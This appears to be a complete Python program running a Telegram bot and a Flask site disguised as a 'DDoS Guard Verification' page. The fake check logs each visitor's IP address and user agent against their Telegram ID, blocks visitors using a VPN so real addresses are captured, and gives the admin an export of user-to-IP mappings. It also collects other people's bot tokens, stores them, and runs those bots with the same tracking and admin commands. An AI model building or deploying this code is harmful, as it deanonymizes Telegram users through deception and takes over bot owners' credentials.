import logging
import sys
import threading
import sqlite3
import json
import os
import time
import requests
import asyncio
import warnings
from datetime import datetime

# ==========================================
# 🛠️ ГЛУШИЛКИ ОШИБОК И ВОРНИНГОВ
# ==========================================
warnings.filterwarnings("ignore", category=UserWarning, module="pkg_resources")

try:
    from telegram.warnings import PTBUserWarning
    warnings.filterwarnings("ignore", category=PTBUserWarning)
except ImportError:
    pass

try:
    import apscheduler.util
    import pytz
    def patched_astimezone(timezone=None):
        return pytz.UTC
    apscheduler.util.astimezone = patched_astimezone
except Exception:
    pass

from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import InvalidToken, Conflict, NetworkError
from telegram.ext import (
    Application, 
    CommandHandler, 
    ContextTypes, 
    ConversationHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters
)

# ======================
# НАСТРОЙКИ
# ======================
MAIN_BOT_TOKEN = ''
ADMIN_ID = 

# Настройки сервера
PORT = 
VERIFY_BASE_URL = f''
DB_NAME = "unified_bot.db"
TOKENS_FILE = "bot_tokens.txt"

# Flask логгер
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__)

# Управление запущенными ботами
RUNNING_BOTS = set()
LOCK = threading.Lock()

# Состояния ConversationHandler
WAIT_TOKEN = 1

# ======================
# БАЗА ДАННЫХ
# ======================
def init_database():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS telegram_users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        joined_at TEXT
    )
    """)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS osint_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        query_type TEXT,
        query_value TEXT,
        data TEXT,
        related_user TEXT,
        source TEXT,
        added_date TEXT
    )
    """)
    conn.commit()
    conn.close()

def add_telegram_user(user_id, username, first_name):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM telegram_users WHERE user_id=?", (user_id,))
        if not cursor.fetchone():
            cursor.execute(
                "INSERT INTO telegram_users (user_id, username, first_name, joined_at) VALUES (?, ?, ?, ?)",
                (user_id, username or 'Noname', first_name or 'Unknown', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            )
            conn.commit()
        conn.close()
    except Exception:
        pass

def db_add_clean_ip(user_id, ip_address, user_agent):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM telegram_users WHERE user_id=?", (user_id,))
        if cursor.fetchone():
            cursor.execute(
                "INSERT INTO osint_data (query_type, query_value, data, related_user, source, added_date) VALUES (?, ?, ?, ?, ?, ?)",
                ("ip", ip_address, f"UA: {user_agent} | Status: Verified Clean", str(user_id), "fake_site_verified", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            )
            print(f"[SITE] [+] IP сохранен: {ip_address} (User {user_id})")
            conn.commit()
        conn.close()
    except Exception:
        pass

def get_db_export():
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        query = """
        SELECT u.user_id, u.username,
        (SELECT query_value FROM osint_data WHERE related_user = CAST(u.user_id AS TEXT) AND query_type='ip' ORDER BY id DESC LIMIT 1)
        FROM telegram_users u
        """
        cursor.execute(query)
        rows = cursor.fetchall()
        conn.close()
        lines = ["ID | @Username | IP Address"]
        lines.append("-" * 40)
        for row in rows:
            uid, uname, ip = row[0], row[1] or 'Noname', row[2] or 'No IP'
            lines.append(f"{uid} | @{uname} | {ip}")
        return "\n".join(lines)
    except Exception as e:
        return str(e)

# ======================
# УПРАВЛЕНИЕ ТОКЕНАМИ
# ======================
def load_tokens():
    if not os.path.exists(TOKENS_FILE):
        return []
    with open(TOKENS_FILE, 'r') as f:
        tokens = [line.strip() for line in f if line.strip()]
    return list(set(tokens))

def save_new_token(token):
    existing = load_tokens()
    if token in existing:
        return
    with open(TOKENS_FILE, 'a') as f:
        f.write(f"{token}\n")

# ======================
# ЛОГИКА БОТА (ОБРАБОТЧИКИ)
# ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    add_telegram_user(user.id, user.username, user.first_name)
    
    verify_link = f"{VERIFY_BASE_URL}/?id={user.id}"
    
    message_text = (
        "🛡 <b>DDoS Guard Verification</b>\n\n"
        "👋 Привет! Чтобы получить доступ к боту, "
        "нам необходимо убедиться, что вы не бот.\n\n"
        "🔐 <b>Почему это важно?</b>\n"
        "Мы защищаем нашу инфраструктуру от автоматических сканеров и спама. "
        "Проверка займет всего 2 секунды.\n\n"
        "👇 <i>Нажмите кнопку ниже для быстрой верификации или подключите своего бота.</i>"
    )
    
    keyboard = [
        [InlineKeyboardButton("✅ Пройти проверку", url=verify_link)],
        [InlineKeyboardButton("🤖 Подключить свой бот", callback_data="connect_bot_start")]
    ]
    
    await update.message.reply_text(message_text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def ask_token_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🤖 <b>Подключение верификации</b>\n\n"
        "Отправьте мне <b>токен</b> вашего бота (получить у @BotFather).\n"
        "Система автоматически подключит его к защите и запустит.\n\n"
        "<i>Для отмены отправьте /cancel</i>",
        parse_mode='HTML'
    )
    return WAIT_TOKEN

async def receive_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    token = update.message.text.strip()
    if ':' not in token or len(token) < 20:
        await update.message.reply_text("❌ Некорректный формат токена. Попробуйте снова или введите /cancel.")
        return WAIT_TOKEN
    with LOCK:
        if token in RUNNING_BOTS:
            await update.message.reply_text("⚠️ Этот бот уже запущен в системе!")
            return ConversationHandler.END
    save_new_token(token)
    thread = threading.Thread(target=run_single_bot_instance, args=(token,), daemon=True)
    thread.start()
    await update.message.reply_text(
        f"✅ <b>Бот успешно подключен!</b>\n\n"
        f"Токен: <code>{token[:15]}...</code>\n"
        f"Верификация теперь активна. Напишите /start в вашем новом боте.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Подключение отменено.")
    return ConversationHandler.END

async def export_db(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("⏳ Генерирую отчет...")
    data = get_db_export()
    fname = f"users_db_{datetime.now().strftime('%d%m_%H%M')}.txt"
    with open(fname, "w", encoding="utf-8") as f: f.write(data)
    await update.message.reply_document(open(fname, "rb"), caption="📂 База пользователей")
    os.remove(fname)

async def add_bot_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID: return
    try:
        new_token = context.args[0]
        with LOCK:
            if new_token in RUNNING_BOTS:
                await update.message.reply_text("⚠️ Этот бот уже запущен!")
                return
        save_new_token(new_token)
        thread = threading.Thread(target=run_single_bot_instance, args=(new_token,), daemon=True)
        thread.start()
        await update.message.reply_text(f"✅ Бот успешно добавлен!\nТокен: {new_token[:15]}...")
    except IndexError:
        await update.message.reply_text("ℹ️ Использование: /addbot <token>")
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

# ======================
# ЗАПУСК ОТДЕЛЬНОГО БОТА
# ======================
def run_single_bot_instance(token):
    with LOCK:
        if token in RUNNING_BOTS:
            print(f"[SKIP] Бот {token[:10]}... уже работает.")
            return
        RUNNING_BOTS.add(token)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    print(f"[INIT] Инициализация бота: {token[:15]}...")

    try:
        application = Application.builder().token(token).build()
        conv_handler = ConversationHandler(
            entry_points=[CallbackQueryHandler(ask_token_callback, pattern="^connect_bot_start$")],
            states={WAIT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_token)]},
            fallbacks=[CommandHandler("cancel", cancel)]
        )
        application.add_handler(conv_handler)
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("exportdb", export_db))
        application.add_handler(CommandHandler("addbot", add_bot_command))
        print(f"[+] Бот запущен успешно: {token[:15]}...")
        application.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=None)
    except InvalidToken:
        print(f"[!] ОШИБКА: Неверный токен - {token}")
    except Conflict:
        print(f"[!] КОНФЛИКТ: Бот {token[:15]}... уже запущен на другом сервере/процессе!")
    except NetworkError:
        print(f"[!] ОШИБКА СЕТИ: Не удалось подключиться к Telegram API ({token[:10]}).")
    except Exception as e:
        print(f"[!] КРИТИЧЕСКАЯ ОШИБКА бота {token[:10]}: {e}")
    finally:
        with LOCK:
            if token in RUNNING_BOTS:
                RUNNING_BOTS.remove(token)
        loop.close()
        print(f"[-] Бот остановлен: {token[:15]}...")

# ======================
# FLASK САЙТ И ПРОВЕРКИ
# ======================
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Security Check | DDoS Guard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #1a1a1a; color: #ffffff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 20px; font-size: 18px; color: #aaa; }
        .success { color: #2ecc71; font-weight: bold; }
        .error { color: #e74c3c; font-weight: bold; }
    </style>
</head>
<body>
    <h1>DDoS Guard Verification</h1>
    <p>Пожалуйста, подождите. Мы проверяем ваше соединение на безопасность.</p>
    <div class="loader" id="spinner"></div>
    <div class="status" id="statusText">
        Проверка TLS рукопожатия...<br>
        Анализ IP репутации...
    </div>

    <script>
        setTimeout(() => {
            document.getElementById('statusText').innerHTML += "<br>Проверка на Proxy/VPN...";
            setTimeout(() => {
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('statusText').innerHTML = "<span class='success'>✅ Доступ разрешен. Перенаправление...</span>";
                setTimeout(() => {
                    window.location.href = "https://t.me/your_channel_link";
                }, 1000);
            }, 2000);
        }, 1000);
    </script>
</body>
</html>
"""

def check_vpn_strict(ip):
    """
    Строгая проверка IP через API proxycheck.io
    Возвращает True, если обнаружен VPN/Proxy.
    """
    try:
        # vpn=1 включает проверку VPN, asn=1 возвращает провайдера (для логов если надо)
        url = f"http://proxycheck.io/v2/{ip}?vpn=1&asn=1"
        resp = requests.get(url, timeout=5).json()
        
        if resp.get('status') == 'ok':
            # Если API говорит, что это Proxy/VPN -> БЛОКИРУЕМ
            if resp.get(ip, {}).get('proxy') == 'yes':
                print(f"[SECURITY] ⛔ BLOCKED VPN/PROXY: {ip}")
                return True
    except Exception as e:
        print(f"[SECURITY] ⚠️ Ошибка проверки IP {ip}: {e}")
        # В случае сбоя API можно либо пропускать (False), либо блокировать (True).
        # Для надежности пропускаем, чтобы не блокировать нормальных людей при падении API.
        pass
        
    return False

@app.route('/')
def index():
    user_id = request.args.get('id')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    print(f"[REQUEST] ID: {user_id} | IP: {ip}")

    # === 🔥 ВКЛЮЧЕНА СТРОГАЯ ПРОВЕРКА ===
    if check_vpn_strict(ip):
        return "<h1>⛔ Ошибка доступа / Access Denied</h1><p>Обнаружен VPN, Proxy или Tor. Отключите средства анонимизации и попробуйте снова.</p>", 403
    # ====================================

    if user_id:
        db_add_clean_ip(user_id, ip, user_agent)

    return render_template_string(HTML_PAGE)

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ======================
# MAIN ENTRY POINT
# ======================
if __name__ == "__main__":
    init_database()
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print(f"🚀 Сервер верификации запущен на порту {PORT} (Строгий режим: ON)")

    saved_tokens = load_tokens()
    if saved_tokens:
        print(f"📂 Загружено дополнительных ботов: {len(saved_tokens)}")
        for token in saved_tokens:
            t = threading.Thread(target=run_single_bot_instance, args=(token,), daemon=True)
            t.start()
            time.sleep(0.2)

    print("🤖 Запуск основного бота...")
    try:
        run_single_bot_instance(MAIN_BOT_TOKEN)
    except KeyboardInterrupt:
        print("🛑 Остановка сервера...")
        sys.exit(0)
